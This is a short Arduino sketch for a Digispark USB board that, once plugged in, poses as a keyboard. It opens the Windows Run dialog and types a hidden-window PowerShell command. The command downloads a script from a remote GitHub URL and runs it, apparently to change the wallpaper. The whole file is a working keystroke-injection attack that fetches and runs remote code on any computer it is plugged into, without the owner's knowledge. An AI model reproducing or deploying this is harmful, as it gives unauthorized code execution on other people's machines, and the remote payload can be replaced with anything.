
// must have http://digistump.com/package_digistump_index.json in board manager urls in arduino ide
// add board via tools > board manager > contributed > digispark
// select baord with tools > board > digistump avr ... > digispark
#include <DigiKeyboard.h>
void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(50);
  DigiKeyboard.print("PowerShell.exe -windowstyle hidden $Response = Invoke-WebRequest -UseBasicParsing https://raw.githubusercontent.com/vmorganp/digispark/master/wallpaper_changer/remote_script.ps1; echo $Response.Content | PowerShell.exe");
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
}
